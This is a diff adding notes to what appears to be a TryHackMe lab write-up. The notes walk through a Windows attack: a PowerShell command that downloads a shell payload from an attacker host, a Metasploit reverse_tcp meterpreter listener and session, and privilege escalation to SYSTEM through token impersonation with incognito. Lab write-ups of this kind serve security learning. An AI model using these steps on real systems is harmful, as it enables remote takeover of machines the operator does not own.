@@ -258,3 +258,147 @@ reset the reverse shell.
 ```
 powershell "(New-Object System.Net.WebClient).Downloadfile('http://<attackerIP>:8000/shell-name.exe','shell-name.exe')"
 ```
+ensure msfconsole is ready to listen for connection to the meterpreter shell:
+```
+use exploit/multi/handler 
+set PAYLOAD windows/meterpreter/reverse_tcp 
+set LHOST your-thm-ip 
+set LPORT listening-port 
+run
+```
+Then to run the payload in powershell 
+```
+PS ...> ./shell-name.exe
+```
+The listener should now connecto to the meterpreter shell just made:
+```msf6 exploit(multi/handler) > run
+[*] Started reverse TCP handler on 10.49.96.111:4445 
+[*] Sending stage (177734 bytes) to 10.49.147.72
+[*] Meterpreter session 1 opened (10.49.96.111:4445 -> 10.49.147.72:49300) at 2026-04-07 19:27:48 +0100
+meterpreter >
+
+
+```
+# Task 3 Privilege Escalation
+
+Goal here is to obtain the lsass.exe tokens, which contain:
+- User SIDs(security identifier) 
+- Group SIDs
+- Privileges
+
+## Jump to powershell check user privileges first
+```
+meterpreter > load powershell
+Loading extension powershell...Success.
+meterpreter > powershell_shell
+PS > whoami /priv
+
+PRIVILEGES INFORMATION
+----------------------
+
+Privilege Name                  Description                               State
+=============================== ========================================= ========
+SeIncreaseQuotaPrivilege        Adjust memory quotas for a process        Disabled
+SeSecurityPrivilege             Manage auditing and security log          Disabled
+SeTakeOwnershipPrivilege        Take ownership of files or other objects  Disabled
+SeLoadDriverPrivilege           Load and unload device drivers            Disabled
+SeSystemProfilePrivilege        Profile system performance                Disabled
+SeSystemtimePrivilege           Change the system time                    Disabled
+SeProfileSingleProcessPrivilege Profile single process                    Disabled
+SeIncreaseBasePriorityPrivilege Increase scheduling priority              Disabled
+SeCreatePagefilePrivilege       Create a pagefile                         Disabled
+SeBackupPrivilege               Back up files and directories             Disabled
+SeRestorePrivilege              Restore files and directories             Disabled
+SeShutdownPrivilege             Shut down the system                      Disabled
+SeDebugPrivilege                Debug programs                            Enabled
+SeSystemEnvironmentPrivilege    Modify firmware environment values        Disabled
+SeChangeNotifyPrivilege         Bypass traverse checking                  Enabled
+SeRemoteShutdownPrivilege       Force shutdown from a remote system       Disabled
+SeUndockPrivilege               Remove computer from docking station      Disabled
+SeManageVolumePrivilege         Perform volume maintenance tasks          Disabled
+SeImpersonatePrivilege          Impersonate a client after authentication Enabled
+SeCreateGlobalPrivilege         Create global objects                     Enabled
+SeIncreaseWorkingSetPrivilege   Increase a process working set            Disabled
+SeTimeZonePrivilege             Change the time zone                      Disabled
+SeCreateSymbolicLinkPrivilege   Create symbolic links                     Disabled
+
+```
+SeImpersonatePrivilege and SeDebugPrivilege are required to impersonate a process or user.
+
+## There are two types of access tokens: 
+(more info on tokens: https://learn.microsoft.com/en-us/windows/win32/secauthz/access-tokens)
+- Primary access tokens: those associated with a user account that are generated on log on.
+- Impersonation tokens: these allow a particular process(or thread in a process) to gain access to resources using the token of another (user/client) process. These are the ones of interest here.
+
+These are the levels of impersonation tokens:
+- SecurityAnonymous: current user/client cannot impersonate another user/client
+- SecurityIdentification: current user/client can get the identity and privileges of a client but cannot impersonate the client
+- SecurityImpersonation: current user/client can impersonate the client's security context on the local system
+- SecurityDelegation: current user/client can impersonate the client's security context on a remote system
+
+Where the security context is a data structure that contains users' relevant security information.
+
+The privileges of an account(which are either given to the account when created or inherited from a group) allow a user to carry out particular actions. Here are the most commonly abused privileges:
+
+SeImpersonatePrivilege
+SeAssignPrimaryPrivilege
+SeTcbPrivilege
+SeBackupPrivilege
+SeRestorePrivilege
+SeCreateTokenPrivilege
+SeLoadDriverPrivilege
+SeTakeOwnershipPrivilege
+SeDebugPrivilege
+There's more reading here (https://www.exploit-db.com/papers/42556).
+
+```
+meterpreter > load incognito
+Loading extension incognito...Success.
+meterpreter > use incognito
+[!] The "incognito" extension has already been loaded.
+meterpreter > list_tokens -g
+[-] Warning: Not currently running as SYSTEM, not all tokens will be available
+             Call rev2self if primary process token is SYSTEM
+
+Delegation Tokens Available
+========================================
+\
+BUILTIN\Administrators
+BUILTIN\Users
+NT AUTHORITY\Authenticated Users
+NT AUTHORITY\NTLM Authentication
+NT AUTHORITY\SERVICE
+NT AUTHORITY\This Organization
+NT SERVICE\AudioEndpointBuilder
+NT SERVICE\CertPropSvc
+NT SERVICE\CscService
+NT SERVICE\iphlpsvc
+NT SERVICE\LanmanServer
+NT SERVICE\PcaSvc
+NT SERVICE\Schedule
+NT SERVICE\SENS
+NT SERVICE\SessionEnv
+NT SERVICE\TrkWks
+NT SERVICE\UmRdpService
+NT SERVICE\UxSms
+NT SERVICE\Winmgmt
+NT SERVICE\wuauserv
+
+Impersonation Tokens Available
+========================================
+No tokens available
+
+meterpreter > 
+```
+impersonate builtin\administrators using incognito
+```meterpreter > getuid
+Server username: alfred\bruce
+meterpreter > impersonate_token "BUILTIN\Administrators"
+[-] Warning: Not currently running as SYSTEM, not all tokens will be available
+             Call rev2self if primary process token is SYSTEM
+[+] Delegation token available
+[+] Successfully impersonated user NT AUTHORITY\SYSTEM
+meterpreter > getuid
+Server username: NT AUTHORITY\SYSTEM
+meterpreter > 
+```
